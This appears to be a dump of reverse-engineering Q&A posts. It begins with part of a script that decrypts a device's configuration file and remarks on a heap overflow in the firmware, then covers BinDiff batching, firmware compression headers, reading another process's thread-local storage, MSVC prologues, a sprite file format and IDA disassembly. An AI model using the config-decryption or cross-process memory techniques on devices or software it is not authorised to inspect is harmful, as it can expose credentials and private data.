print 'block buffer size: %x'%(block_buffer_size)

#--------------------
# read the blocks
fout = open('%s.xml'%(sys.argv[1]), 'wb')
cumulate_crc = 0
while (True):
    bheader = cf.read(0x0c)
    if (len(bheader) == 0):
        break
    block_size = struct.unpack('!L', bheader[0x04:0x08])[0]
    print 'block size: %x'%(block_size)

    # read the whole block to previously allocated buffer
    # Possible heap based buffer overflow, because the size was not checked in
    # the dbcCfgFileDecry function!
    block = cf.read(block_size)
    cumulate_crc = binascii.crc32(block, cumulate_crc)&amp;0xffffffff
    decompressed = zlib.decompress(block)
    fout.write(decompressed)

stored_cumulate_crc = struct.unpack('!L', h2[0x14:0x18])[0]
print 'cumulate crc: calc: %x - stored: %x'%(cumulate_crc, stored_cumulate_crc)
if (cumulate_crc != stored_cumulate_crc):
    print 'Invalid cumulate CRC'
    sys.exit(-3)

cf.close()
fout.close()
</code></pre>

<p>As a side note, the <code>dbcCfgFileDecry</code> function contains a heap-based buffer overflow vulnerability, because it did not check whether the current block will fit into the allocated buffer.</p>
","13395"
"IDA Pro/IDAPython automation through IDAPython","892","","<p>I have been trying to use IDA Pro (with bindiff) via IDAPython to automate the analysis process of a bios.dump file while outputting the results to a .txt / .asm file. From here I want to use the bindiff functions to compare this database with another database and output any differences to a file.  Any recommendations? </p>
","<p>With the now free <a href=""https://www.zynamics.com/software.html"" rel=""nofollow"">BinDiff 4.2</a> you can do batch analysis with a bit of work.</p>

<p>In the BinDiff installation directory (<code>zynamics/BinDiff 4.2</code>), you will find <code>bin/differ.exe</code> and <code>bin/differ64.exe</code>. Those are binaries for batch diffing of IDBs and <code>.BinExport</code> files.</p>

<p>The basic usage would be:</p>

<pre><code>differ --primary=&lt;directory-with-IDBs&gt; --output-dir=&lt;output-directory&gt;
</code></pre>

<p>Sadly, this does not work (at least on my machine) as <code>differ.exe</code> fails to find IDA's executable and tries to execute the directory instead.</p>

<p>To solve this, we will export IDBs using the following command:</p>

<pre><code>""&lt;path-to-idaq.exe&gt;"" -A -OExporterModule:&lt;result-directory&gt; -S""&lt;path-to-export-script&gt;"" ""&lt;path-to-idb&gt;""
</code></pre>

<p>The <code>export-script</code> is an <code>.idc</code> with the following code:</p>

<pre><code>#include &lt;idc.idc&gt;

static main()
{
    Batch(0);
    Wait();
    Exit(1 - RunPlugin(""zynamics_binexport_8"", 2));
}
</code></pre>

<p>Once you have all your <code>.BinExport</code> files in one directory, run the original <code>differ.exe</code> command on that directory (give it the directory with the <code>.BinExport</code> files instead of the <code>.idb</code> files), and you'll get <code>.BinDiff</code> files for all possible diffs. Those can either be opened up in IDA, or manually parsed (they are SQLite databases).</p>
","13699"
"Non standard LZ77 compression header","889","","<p>I'm working on reversing the SJ4000 camera firmware but I found a problem unpacking it.</p>

<p>This is the header I found on the image:</p>

<pre><code>00000000  42 43 4c 31 81 66 00 09  00 54 68 e0 00 2f 2b bf  |BCL1.f...Th../+.|
</code></pre>

<p>As you can see BCL1 is the header for 'Basic Compression Library' ( <a href=""http://bcl.comli.eu/home-en.html"" rel=""nofollow"">http://bcl.comli.eu/home-en.html</a> ) using LZ77 algorithm but I can't decompress the image with it.</p>

<p>I built some files using BCL, compared to the firmware header and found this:</p>

<pre><code>00000000  42 43 4c 31 81 66 00 09  00 54 68 e0 00 2f 2b bf  |BCL1.f...Th../+.| &lt; FIRMWARE
00000000  42 43 4c 31 00 00 00 09  00 00 4f 88 99 7f 45 4c  |BCL1......O...EL| &lt; LZ
00000000  42 43 4c 31 00 00 00 02  00 00 4f 88 20 03 06 90  |BCL1......O. ...| &lt; HUFFMAN
00000000  42 43 4c 31 00 00 00 01  00 00 4f 88 99 7f 45 4c  |BCL1......O...EL| &lt; RLE
00000000  42 43 4c 31 00 00 00 0a  00 00 4f 88 56 01 64 9f  |BCL1......O.V.d.| &lt; SF
00000000  42 43 4c 31 00 00 00 03  00 00 4f 88 00 7f 45 4c  |BCL1......O...EL| &lt; RICE8
00000000  42 43 4c 31 00 00 00 04  00 00 4f 88 00 45 7f 46  |BCL1......O..E.F| &lt; RICE16
00000000  42 43 4c 31 00 00 00 05  00 00 4f 88 00 46 4c 45  |BCL1......O..FLE| &lt; RICE32
</code></pre>

<p>According to this the compression algorithm is LZ77 and it follows the same structure except for 2 bytes.</p>

<pre><code>42 43 4c 31 &lt; Magic Number
81 66 00 09 &lt; unknown 2 bytes + 2 standard bytes 
00 54 68 e0 &lt; Original Size
00 2f 2b bf &lt; Compressed Size
</code></pre>

<p>Any idea what these 2 bytes mean?</p>

<p>EDIT: I tried to edit that 2 bytes and override them with 00 00 so the header matches the standard. After that tried to uncompress it with BCL LZ77 and it prompts a segmentation fault:</p>

<pre><code>LZ77 decompress FW96655A_ZERO.bin to test...
Input file: 3091395 bytes
Output file: 5531872 bytes
Segmentation fault
</code></pre>

<p>Checking the lenght bytes I got the following result:</p>

<pre><code>0x005468E0 &gt; Big Endian Long: 5531872
0x002F2BBF &gt; Big Endian Long: 3091391
</code></pre>

<p>As you can see for the compressed data length there is a difference of 4 bytes that might be causing the Seg. fault.</p>
","<p>I don't know for sure but can think of two possibilities.  </p>

<ol>
<li><p>One is that it's simply a coding error and only the low half of the 32-bit register was initialized when the file was created.  If that's the case, then simply zeroing those two bytes should result in a successful decompression using the standard tool.</p></li>
<li><p>The other is that it's a (proprietary) modification to the normal LZ77 decompression, in which case, it's likely to be a minor enhancement rather than a completely new scheme.</p></li>
</ol>

<p>All of the samples of that camera's firmware that I was easily able to locate on the internet use the standard <code>00 00 00 09</code> tag, which may indicate that the first possibility is the more likely.</p>

<p>After checking with the binary you mentioned, it became clear that there was simply an error in the <code>bfc.c</code> file.  Specifically, around line 192 of <code>bfc.c</code> it says:</p>

<pre><code>if( command == 'd' )
{
    /* Read header */
    algo = ReadWord32( f );  /* Dummy */
    algo = ReadWord32( f );
    outsize = ReadWord32( f );
    insize -= 12;
}
</code></pre>

<p>However, this is incorrect because it fails to read the <code>infile</code> size as written in the header.  To quickly fix this, just change those lines to these and recompile:</p>

<pre><code>if( command == 'd' )
{
    /* Read header */
    algo = ReadWord32( f );  /* Dummy */
    algo = ReadWord32( f );
    outsize = ReadWord32( f );
    ReadWord32( f );
    insize -= 16;
}
</code></pre>

<p>When I do that, there is no problem decompressing the code.  To make the corresponding change to the output file (that is, compressing), change the code around line 364 of <code>bfc.c</code> from this:</p>

<pre><code>/* Write output file */
WriteWord32( outsize, f );
fwrite( out, outsize, 1, f );
fclose( f );
</code></pre>

<p>to this:</p>

<pre><code>/* Write output file */
fwrite( out, outsize, 1, f );
fclose( f );
</code></pre>

<p>I should probably mention the likely reason this change was done.  In the original program, the file size can be used to determine the size, but in an undifferentiated array of bytes (i.e. no file system) as is often the case in ROM, it is useful to encode both input and output files sizes within the header.</p>
","6593"
"edit instructions directly in visual mode","887","","<p>I know we can edit opcodes in radare2's visual mode using <code>i</code>.<br>
But is there any way to edit instructions directly in visual mode?</p>

<p>In my case, instruction is <code>jae 0x8048450</code>,<br>
and i want change it to <code>jnbe 0x8048450</code></p>
","<p>This is called <em>assembling</em> - the reverse of ""disassembling"".</p>

<p>You can do so with the command <code>wa</code> (presumably, ""write assembly""). It can be found in the <a href=""https://github.com/radare/radare2/blob/master/doc/intro.md"" rel=""nofollow noreferrer"">Radare2 cheat sheet</a>:</p>

<pre><code>wa jnz 0x400d24
</code></pre>
","14225"
"How can I find the Thread Local Storage (TLS) of a Windows Process Thread?","885","","<p>The Thread Local Storage (TLS) contains static or global values for a thread. Those values can be very important to find reliable references to memory structures when the memory locations are not static.</p>

<p>I would like to get the Thread Local Storage of another process.</p>

<p>The TLS should be at <a href=""http://en.wikipedia.org/wiki/Win32_Thread_Information_Block"">[FS:0x2C] in the Thread Information Block (TIB)</a>. Though I quite don't understand how the FS register works. I guess I have to find the TIB Base address first? I think I can find it in the Thread Context I can get with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms679362%28v=vs.85%29.aspx"">WINAPI GetThreadContext</a>, but I am a little bit overwhelmed.</p>
","<p>You need to use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms679363%28v=vs.85%29.aspx""><code>GetThreadSelectorEntry()</code></a>.</p>

<p>Pseudocode:</p>

<pre><code>GetThreadContext(hThread, &amp;context);
GetThreadSelectorEntry(hThread, context.SegFs, &amp;selectorEntry);
ReadProcessMemory(hProcess, (selectorEntry.BaseLow | (selectorEntry.HighWord.Bytes.BaseMid &lt;&lt; 0x10) | (selectorEntry.HighWord.Bytes.BaseHi &lt;&lt; 0x18)) + 0x2C, &amp;pTLS, sizeof(pTLS), &amp;numberOfBytesRead);
</code></pre>

<p>You can see the function <code>GetProcessEntryPointAddress()</code> <a href=""http://nerdworks.in/downloads/myselfdel.c"">here</a> for some sample code that does something similar.</p>
","3140"
"Reverse Engineering iOS Apps on a Mac OS X","884","","<p>I want to learn to Reverse Engineer iOS Apps. I know exactly what I need to do and I've got almost everything set up. My iPhone is jailbroken, I have installed OpenSSH to SSH into the iPhone from my Mac and installed Cycript, otool and Clutch. Now the only thing holding me back is getting an Interactive Disassembler. Could you point me in the right direction of an IDA I could use on my Mac laptop that would feature most things and is very efficient?</p>

<p>Thanks.</p>
","<p>Your best options are <a href=""https://www.hex-rays.com/products/ida/"" rel=""nofollow"">IDA Pro</a> and <a href=""http://www.hopperapp.com/"" rel=""nofollow"">Hopper</a>.</p>
","11052"
"Reverse engineering file containing sprites","883","","<p>I'm trying to reverse engineer a file that contains sprites. I want to extract the sprites out of the file. So far I've managed to find some kind of line end sequence, and with this I've been able to confirm that the sprites are in the file:</p>

<p><img src=""https://i.stack.imgur.com/JNEA4.png"" alt=""monochrome dump of file""></p>

<p>I'm using C++ and SDL. I load the file as a series of chars, and then plot a white pixel if the char>128 and a black if the char&lt;128. It's very crude and I don't know how to proceed. How do I find where color is stored? Or an alpha channel? Or what is in the header? Etc.</p>

<p>If you know of any online resources that could be helpfull, please let me know. I'm kind of lost at where to start. These are first couple of bytes from the file I'm trying to reverse engineer, maybe this will help:</p>

<p><img src=""https://i.stack.imgur.com/TQdJl.png"" alt=""hex dump of file""></p>

<p>The game is State of War. Its my childhoods' dream to write a remake of this game. I'm currently making a remake, but I'm using placeholder graphics. Thats why I need the sprites. I will not use it for commercial purposes.</p>

<p>There are 2 kinds of sprite files. *.tsp files, and a big sprites.data and sprites.info file. I've uploaded some files <a href=""http://www.filedropper.com/data_6"" rel=""nofollow noreferrer"">here</a>.</p>
","<p>You got started well; plotting unknown data as pixels immediately showed you this is indeed graphic data, not compressed (at least the buttons aren't), and in a usable RGB order. I guess the missing RGB format was what held you back; now you know it, you can write a simple program to plot in color and show offsets and widths of the images. Armed with that information, you can inspect the unknown bytes before (and possibly after) the images, and derive their meaning.</p>

<hr>

<h2>General overview</h2>

<p>The file <code>001_buttons.tsp</code> consists of a series of images, without a general file header but with a header per image.</p>

<p>The first long word of this header (4 bytes, little endian format) is the size of the following data in bytes, excluding the header itself (this length may be <code>0</code>). Then follow width and height as words. The next 12 bytes are 3 word-sized x,y pairs; the first pair is the center of the image. The coordinates are signed words, they wrap around at <code>0xFFFF/2</code>. The other pairs still serve an unknown purpose.</p>

<p>After that, you have (height) times the offset of the next image scan line in <em>words</em>, offset from the start by 4 (so 4+2*offset = next line).</p>

<p>Each scan line pointed to by these offsets is Run-Length Encoded (RLE) compressed. Transparent runs are indicated only by the number of horizontal pixels to skip; opaque runs can be copied directly to the screen. There is no alpha transparency in these images. Each scan line fills exactly <em>width</em> pixels after decompressing.</p>

<p>The pixel format is packed 16-bit RGB: <code>RRRR.RGGG.GGGB.BBBB</code>, which can be converted to 24-bit RGB in the following (not optimized) way:</p>

<pre><code>putpixel (x,y, (((val &gt;&gt; 8) &amp; 0xf8)&lt;&lt;16) | (((val &gt;&gt; 3) &amp; 0xfc)&lt;&lt;8) | ((val &amp; 0x1f)&lt;&lt;3) );
</code></pre>

<p>where <code>val</code> is simply the next word: <code>data[c]+(data[c+1]&lt;&lt;8)</code>.</p>

<p><img src=""https://i.stack.imgur.com/x17Vf.png"" alt=""sample dump""></p>

<hr>

<h2>Run-Length Encoding format</h2>

<p><img src=""https://i.stack.imgur.com/ComX6.png"" alt=""rle unpacked image""></p>

<p>All values mentioned hereafter are <em>word</em> sized (2 bytes, little endian).<br>
Each scan line starts with the <em>number of commands</em> for that line and a flag indicating whether to start with a ""skip"" or ""copy"". If the flag word after the number of commands is <code>0000</code>, the line starts with a ""skip"", and if it is <code>0001</code>, the line starts with a ""copy"".<br>
After that, ""skip"" and ""copy"" commands alternate until the entire scan line is filled. Each command is the number of pixels to skip or copy; for ""copy"", the actual pixel values follow directly after it.</p>

<p>All lines should be filled entirely -- if necessary, the command list ends with a number of 'empty' pixels to skip.</p>

<p><img src=""https://i.stack.imgur.com/bUS0Y.png"" alt=""new game overlay""></p>

<hr>

<p>Not all objects in <code>sprites.data</code> <em>are</em> sprites in this format. There are at least two different types:</p>

<ol>
<li><p>A monochrome mask object, using the same RLE compression scheme but without pixel data -- it contains only the length of each run. This could be to draw a mask, overlay a color, or aid in pixel-perfect object selection.</p></li>
<li><p>A list of signed word pairs of unknown use.</p></li>
</ol>

<p>Neither these objects nor the actual sprites have a recognizable identifier at the start, so you can only find out which is which by trial and error (for example: if the reported 'size' of an image is negative or larger than the entire data file, you know it cannot be an RLE-compressed image after all).</p>

<hr>

<h2>Sprite index file</h2>

<p>The index file <code>sprite.info</code> is obfuscated, but not by much. It has the following format:</p>

<pre><code>4 x some byte flag (all `01` in this file)
long  total number of objects (377, in this file)
377 x
      0-terminated ""filename"" (obfuscated)
      long offset in 'sprite.data'
      long length in 'sprite.data'
</code></pre>

<p>The filename is obfuscated by adding the constant <code>10</code> to each character. Decoding this, you get a list of 377 items:</p>

<pre><code>__extras\compplay.ps6                | 00000000 000000C0
__extras\dim1.ps6                    | 000000C0 00000BC4
__extras\dim2.ps6                    | 00000C84 00000EB4
...
units\tur_05_blue.ps6                | 01FAC346 00013E12
units\tur_05_gren.ps6                | 01FC0158 00013E12
units\turrets_shadow.ps6             | 01FD3F6A 00013C9C
</code></pre>

<p>This is some sort of general index, as clearly not all images are listed. It must list only the first of an animated set; the 'length' is then the total length of all files in that particular set. The file extensions are a hint to their contents: files ending with <code>.ps6</code> all contain at least one image (and may contain more), files ending with <code>.msk</code> are probably a monochrome mask and <code>.sha</code> possibly shadows. The <code>.po<em>digit</em></code> files contain coordinate pairs.</p>
","8112"
"Understanding x86 C main function preamble created by Visual C++","883","","<p>I was debugging a simple x86-64 program in Visual Studio 2010 and I noticed that the <code>main</code> function preamble is different from the GNU GCC compiled version of the same C program.</p>

<p>To illustrate what I mean here is the C code for the <code>main</code> function:</p>

<pre><code>int main() {
  int a,b,c;
  a=1;
  b=2;
  c=proc(a,b);
  return c;
}
</code></pre>

<p>The Visual Studio 2010 disassembly of the <code>main</code> function <strong>preamble</strong> for the  VC++ version is:</p>

<pre><code>01211410  push        ebp  
01211411  mov         ebp,esp  
01211413  sub         esp,0E4h  
01211419  push        ebx  
0121141A  push        esi  
0121141B  push        edi  
0121141C  lea         edi,[ebp-0E4h]  
01211422  mov         ecx,39h  
01211427  mov         eax,0CCCCCCCCh  
0121142C  rep stos    dword ptr es:[edi]
</code></pre>

<p>The rest of the function code of the VC++ version is:</p>

<pre><code>0081141E  mov         dword ptr [a],1  
00811425  mov         dword ptr [b],2  
0081142C  mov         eax,dword ptr [b]  
0081142F  push        eax  
00811430  mov         ecx,dword ptr [a]  
00811433  push        ecx  
00811434  call        proc (81114Fh)  
00811439  add         esp,8  
0081143C  mov         dword ptr [c],eax  
0081143F  mov         eax,dword ptr [c]  
00811442  pop         edi  
00811443  pop         esi  
00811444  pop         ebx  
00811445  add         esp,0E4h  
0081144B  cmp         ebp,esp  
0081144D  call        @ILT+300(__RTC_CheckEsp) (811131h)  
00811452  mov         esp,ebp  
00811454  pop         ebp  
00811455  ret 
</code></pre>

<p>The disassembly of the <code>main</code> function <strong>preamble</strong> for the GCC compiled version is:</p>

<pre><code>00400502  push   rbp
00400503  mov    rbp,rsp
00400506  sub    rsp,0x10
</code></pre>

<p>The rest of the <code>main</code> function code of the GCC version is:</p>

<pre><code>004004e8  mov    DWORD PTR [rbp-0xc],0x1
004004ef  mov    DWORD PTR [rbp-0x8],0x2
004004f6  mov    edx,DWORD PTR [rbp-0x8]
004004f9  mov    eax,DWORD PTR [rbp-0xc]
004004fc  mov    esi,edx
004004fe  mov    edi,eax
00400500  call   0x4004cc &lt;proc&gt;
00400505  mov    DWORD PTR [rbp-0x4],eax
00400508  mov    eax,DWORD PTR [rbp-0x4]
0040050b  leave
0040050c  ret
</code></pre>

<p>The same disassembly is given by <code>objdump</code> version 2.22.90.20120924.</p>

<p>I realize that the first 3 instructions for both preambles do the following:</p>

<ol>
<li>Save old EBP (later needed to remove stack frame)</li>
<li>Top of old stack frame becomes EBP of new frame</li>
<li>Reserve space for local variables. The function has 3 integer local variables.</li>
</ol>

<p><strong>Question 1:</strong> What is the purpose of 4th instruction in the VC++ version? I see its saving EBX, but why? It never uses it afterwards.</p>

<p>For the remaining instructions of the VC++ version preamble, I relized that it initializes  <code>39h</code> dwords with the value <code>0CCCCCCCCh</code>. Which makes sense because <code>39h * 4h = 0E4h</code>.</p>

<p><strong>Question 2:</strong> Why is this space initialized with the value <code>0CCCCCCCCh</code>? Is this value better than <code>00000000h</code> in some way?</p>

<p><strong>Question 3:</strong> Why does the VC++ version allocate <code>0E4h</code> bytes for 3 local variables? Is this number random? If not, how is it computed?</p>

<p><strong>Question 4:</strong> Is this space used for something else beside local variables? If yes, for what?</p>
","<p>The extra space on the stack is there to support the Edit and Continue functionality and can be eliminated by changing /Zl to /Zi. The saved ebx and initialization of the stack to 0xcc is done by the <a href=""http://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx"" rel=""nofollow noreferrer"">/RTC Runtime Checking Option</a>.</p>

<p>There was a <a href=""https://stackoverflow.com/questions/2077074/understanding-the-c-function-call-prolog-with-cdecl-on-windows"">similar question</a> asked on SO.</p>

<p>The windows example, by the way, is clearly a 32 bit binary. x64 windows calling convention uses RCX, RDX, R8, and R9 as the first 4 integer/pointer arguments (instead of the stack).</p>
","3975"
"OllyDbg and XMM0 vs MM0 registers","880","","<p>How can I view the <code>XMM0</code>-<code>XMM7</code> registers within OllyDbg? I can right click on the registers window and go to <code>view MMX</code> registers, but I'm not exactly sure that these are the same. I see an instruction: <code>MOVSS DWORD PTR DS:[ESI+8],XMM0</code> and as step through that instruction, the value shown in <code>MM0</code> on the register window does not become the value stored at <code>[ESI+8]</code>.</p>

<p>So, I suppose another question is: <em>Are the <code>XMM0</code> and <code>MM0</code> registers different?</em></p>
","<p>To answer properly your question, yes. <code>xmm</code> registers were introduced by Intel with the <code>SSE</code> instruction set (IS) in 1999 with the Pentium III CPU. <code>SSE</code> stands for Streaming SIMD Extension and is a set of vector instructions. <code>xmm</code> registers are 128bit wide and can hold 4 <code>floats</code>, 2 <code>doubles</code>, or 16 <code>chars</code>. <code>SSE</code> can speed up signal processing applications (image processing, sound processing, compression, ...), encryption, and others quite dramatically when used properly. </p>

<p>On the other hand, <code>mm</code> registers are part of the <code>MMX</code> IS, another vector instruction set older than <code>SSE</code> (1997 I suppose), and are 64bit wide. 
Nowadays the vector instruction sets are becoming quite a <em>fashion</em> in a certain way (vector <code>CPUs</code> were the standard for supercomputers back in the 70s &amp; 80s - Cray's, ThinkingMachine's, ... computer were all vector based). In the past few years, Intel came up with many versions of <code>SSE</code> and two new IS called <code>AVX</code> &amp; <code>AVX2</code> (Advanced Vector Extension) with 256bit wide vectors implemented on SandyBridge/IvyBridge/Haswell, and <code>AVX-512</code> first implemented on the KNC (Knight's Corner) of the Xeon Phi processor &amp; co-processor line.</p>

<p>I encourage you to check the Intel documentation &amp; Wikipedia for more information.   </p>
","4370"
"Can someone tell me what this memcpy or maybe it's a memset? looks like a memset, rep movsd and rep movsb This is a packet sending function","878","","<p>Trying to understand a function thats responsible for sending out a packet.
I don't understand could it be a integer array or something? or some inline function that's not properly getting rendered in Hex-Rays</p>

<p>I understand the else statement sends a 4 byte packet which contains a timestamp of the GetTickCount API.</p>

<p>The if statement should send the packet that comes in the <code>a2</code> is the pointer to characters with a3 being the size for all the characters.</p>

<p>Usage is similar to this</p>

<pre><code>char buffer[448];
memset(buffer, 0, sizeof(buffer));
//blah blah packet stuff here
strncpy(&amp;buffer[90], ""blah blah blah"", 250u);
buffer[339] = 0;
//then the call below.
// 91+250+91 = 432, yet memset is 448, 16 extra probably stack padding.
test(*v28, buffer, strlen(&amp;buffer[90]) + 91);
</code></pre>

<p><p></p>

<p>Here is the original code decompiled from Hex-Rays.</p>

<pre><code>void __thiscall test(void *this, const void *a2, unsigned int a3)
{
  void *v3; // ebx@1
  char *v4; // eax@3
  int v5; // [sp-8h] [bp-418h]@3
  int v6; // [sp-4h] [bp-414h]@3
  char v7[4]; // [sp+Ch] [bp-404h]@4
  char buf[1024]; // [sp+10h] [bp-400h]@3

  v3 = this;
  if ( a2 &amp;&amp; (signed int)a3 &gt; 0 )
  {
    *(_DWORD *)buf = 0;
    memcpy(&amp;buf[4], a2, 4 * (a3 &gt;&gt; 2));
    v6 = 0;
    v5 = a3 + 4;
    v4 = buf;
    memcpy(&amp;buf[4 * (a3 &gt;&gt; 2) + 4], (char *)a2 + 4 * (a3 &gt;&gt; 2), a3 &amp; 3);// Looks like Copy by DWORDs, not by Bytes.
  }
  else
  {
    v6 = 0;
    *(_DWORD *)v7 = GetTickCount() / 0xA;
    v5 = 4;
    v4 = v7;
  }
  send(*(_DWORD *)v3, v4, v5, v6);
}
</code></pre>

<p>Here I fixed it up a little by hand, still don't understand it.</p>

<pre><code>void __thiscall test(void *this, const void *a2, unsigned int a3)
{
  void *v3; // ebx@1
  char *v4; // eax@3
  int v5; // [sp-8h] [bp-418h]@3
  int v6; // [sp-4h] [bp-414h]@3
  char v7[4]; // [sp+Ch] [bp-404h]@4
  char buf[1024]; // [sp+10h] [bp-400h]@3

  v3 = this;
  if ( a2 &amp;&amp; (signed int)a3 &gt; 0 )
  {
    *(_DWORD *)buf = 0;
    //Might be a swap of the 5th offset DWORD to end of the packet?
    //Or maybe it fills in the packet offsetted by the first 4 bytes?
    memcpy(&amp;buf[4], a2, 4 * (a3 / 4)); // Looks like Copy by DWORDs, not by Bytes.
    v6 = 0;
    v5 = a3 + 4;
    v4 = buf;
    //Might be a swap of the end of the packet to the 5th offset DWORD?
    //Looks like some kind of footer to above memcpy function like to finish what the first function couldn't do?
    memcpy(&amp;buf[4 * (a3 / 4) + 4], (char *)a2 + 4 * (a3 / 4), a3 &amp; 3);// Looks like Copy by DWORDs, not by Bytes.
  }
  else
  {
    v6 = 0;
    *(_DWORD *)v7 = GetTickCount() / 0xA;
    v5 = 4;
    v4 = v7;
  }
  send(*(_DWORD *)v3, v4, v5, v6);
}
</code></pre>

<p>Okay I gave it some more time could this be the correct?</p>

<pre><code>void __thiscall test(void *this, const void *a2, unsigned int a3)
{
  void *v3; // ebx@1
  char *v4; // eax@3
  int v5; // [sp-8h] [bp-418h]@3
  int v6; // [sp-4h] [bp-414h]@3
  char v7[4]; // [sp+Ch] [bp-404h]@4
  char buf[1024]; // [sp+10h] [bp-400h]@3

  v3 = this;
  if ( a2 &amp;&amp; (signed int)a3 &gt; 0 )
  {
    *(_DWORD *)buf = 0;
    memmove(&amp;buf[4],a2,a3 - 4); 

    v6 = 0;
    v5 = a3 + 4;
    v4 = buf;
  }
  else
  {
    v6 = 0;
    *(_DWORD *)v7 = GetTickCount() / 0xA;
    v5 = 4;
    v4 = v7;
  }
  send(*(_DWORD *)v3, v4, v5, v6);
}
</code></pre>

<p>Assembly below</p>

<pre><code>.text:00408750 ; =============== S U B R O U T I N E =======================================
.text:00408750
.text:00408750
.text:00408750 ; void __thiscall test(void *this, const void *a2, unsigned int a3)
.text:00408750 test proc near
.text:00408750                                         ; CODE XREF: ServerMainLoop+5DDp
.text:00408750                                         ; ServerMainLoop+64Dp
.text:00408750
.text:00408750 var_404         = byte ptr -404h
.text:00408750 buf             = byte ptr -400h
.text:00408750 a2              = dword ptr  4
.text:00408750 a3              = dword ptr  8
.text:00408750
.text:00408750                 sub     esp, 404h
.text:00408756                 push    ebx
.text:00408757                 push    esi
.text:00408758                 mov     esi, [esp+40Ch+a2]
.text:0040875F                 push    edi
.text:00408760                 test    esi, esi
.text:00408762                 mov     ebx, ecx
.text:00408764                 jz      short loc_408799
.text:00408766                 mov     eax, [esp+410h+a3]
.text:0040876D                 test    eax, eax
.text:0040876F                 jle     short loc_408799
.text:00408771                 mov     ecx, eax
.text:00408773                 lea     edi, [esp+410h+buf+4]
.text:00408777                 mov     edx, ecx
.text:00408779                 mov     dword ptr [esp+410h+buf], 0
.text:00408781                 shr     ecx, 2
.text:00408784                 rep movsd
.text:00408786                 mov     ecx, edx
.text:00408788                 push    0
.text:0040878A                 and     ecx, 3
.text:0040878D                 add     eax, 4
.text:00408790                 push    eax
.text:00408791                 lea     eax, [esp+418h+buf]
.text:00408795                 rep movsb
.text:00408797                 jmp     short loc_4087B7
.text:00408799 ; ---------------------------------------------------------------------------
.text:00408799
.text:00408799 loc_408799:                             ; CODE XREF: test+14j
.text:00408799                                         ; test+1Fj
.text:00408799                 call    ds:GetTickCount
.text:0040879F                 mov     edx, eax
.text:004087A1                 mov     eax, 0CCCCCCCDh
.text:004087A6                 mul     edx
.text:004087A8                 shr     edx, 3
.text:004087AB                 push    0               ; flags
.text:004087AD                 mov     dword ptr [esp+414h+var_404], edx
.text:004087B1                 push    4               ; len
.text:004087B3                 lea     eax, [esp+418h+var_404]
.text:004087B7
.text:004087B7 loc_4087B7:                             ; CODE XREF: test+47j
.text:004087B7                 mov     ecx, [ebx]
.text:004087B9                 push    eax             ; buf
.text:004087BA                 push    ecx             ; s
.text:004087BB                 call    send
.text:004087C0                 pop     edi
.text:004087C1                 pop     esi
.text:004087C2                 pop     ebx
.text:004087C3                 add     esp, 404h
.text:004087C9                 retn    8
.text:004087C9 test endp
.text:004087C9
.text:004087C9 ; ---------------------------------------------------------------------------
</code></pre>
","<p>This code is easy, it's just a bit messy 'cause it was generated by a <code>decompiler</code>. Here's a much simpler commented version :</p>

<pre><code>void __thiscall test(void *this, const void *a2, unsigned int a3)
 {
    char v7[4]; 
    int  v5 = 4;
    void *v3 = this;
    char buf[1024], *v4;

    if (a2 != NULL &amp;&amp; (signed int)a3 &gt; 0)
    {
      //Setting the 4 first bytes to 0. Certainly the message header !
      *(_DWORD *)buf = 0;

      /*
         Same as :
         memset(buff, 0, 4);
         buf[0] = buf[1] = buf[2] = buf[3] = 0; 
       */

      /*
         Copying the first a3 bytes of a2 into buff + 4. 
         The + 4 is to jump the 4 bytes header set to 0 previously. 
       */ 
      memcpy(buf + 4, a2, a3); //There's no point in 4 * a3 / 4;

      //Size has changed to a3 + 4 (4 bytes for the header)
      v5 += a3;

      //
      v4 = buf;
    }
    else
    {
       /* _DWORD is 4 bytes. This line converts v7 into an integer to
           copy the value of GetTickCount() / 10 byte by byte into it.  
        */
      *(_DWORD *)v7 = GetTickCount() / 10;

      //
      v4 = v7;
    }

    send(*(_DWORD *)v3, v4, v5, 0);
 }
</code></pre>

<p>From this I would say that this routine sends a packet with the header set to GetTickCount() / 10 if there's no message (a2 == NULL or a3 &lt;= 0), otherwise it sets the message header to 0, the message itself to a2 and sends the packet.</p>

<p>The thing about the original version you provided is that it was performing a copy 4 elements by 4 ... That's why the <code>memcpy</code> was split in two. The first one copying the elements 4 * (a3 / 4) (if a3 = 19 then it would've copied 16 elements), the second one copying the remaining a3 % 4 (a3 % 4 &lt;==> a3 &amp; (4 - 1) &lt;==> a3 &amp; 3) elements (if a3 = 19 then it would've copied 3). </p>
","4190"
"IDA Pro 64 bit disassembly error for system DLLs","878","","<p>I use IDA Pro 6.8.150428 (idaq64.exe) to disassemble system dlls (64 bit) e.g. ntdll.dll, kernel32.dll, etc. in Windows 10 64 bit. I found idaq64.exe correctly disassembling 64 bit sample applications (.exe) but generating incorrect dis-assembly for the dlls e.g. shows 32 bit register operands, etc. I checked the IDA Pro dis-assembly output with WinDbg (runtime) and Intel XED (static) output. While Windbg and XED outputs are consistent with each other, they are completely different than that of IDA Pro.</p>

<p>Runtime disassembly in WinDbg @00007ffda61c12e0</p>

<pre><code>00007ffda61c12db      call    ntdll!NtQueryPerformanceCounter (00007ffda6213b30)
00007ffda61c12e0      mov     eax,dword ptr [rsp+30h]
00007ffda61c12e4      mov     rsi,qword ptr [rsp+40h]
00007ffda61c12e9      shl     rax,20h
00007ffda61c12ed      xor     rax,qword ptr [rsp+30h]
00007ffda61c12f2      xor     rax,rbx
00007ffda61c12f5      mov     rbx,qword ptr [rsp+38h]
00007ffda61c12fa      xor     rax,rdi
00007ffda61c12fd      add     rsp,20h
00007ffda61c1301      pop     rdi
00007ffda61c1302      ret
</code></pre>

<p>The static address in the ntdll.dll binary corresponding to the runtime address mentioned above (7ffda61c12e0) is 4b2c12e0. I even don't see the address in ntdll.dll dis-assembly in IDA Pro. It shows:</p>

<pre><code>.text:4B2C12DF                 test    eax, eax
.text:4B2C12E1                 js      loc_4B30C906
.text:4B2C12E7                 mov     [esp+278h+var_255], 1
.text:4B2C12EC
.text:4B2C12EC loc_4B2C12EC:                           ; CODE XREF: LdrpPreprocessDllName(x,x,x,x)+4B66Bj
.text:4B2C12EC                 mov     ecx, [esp+278h+var_254]
.text:4B2C12F0                 xor     ebx, ebx
.text:4B2C12F2                 xor     dl, dl
.text:4B2C12F4                 mov     [esp+278h+var_264], ebx
.text:4B2C12F8                 mov     [esp+278h+var_25D], dl
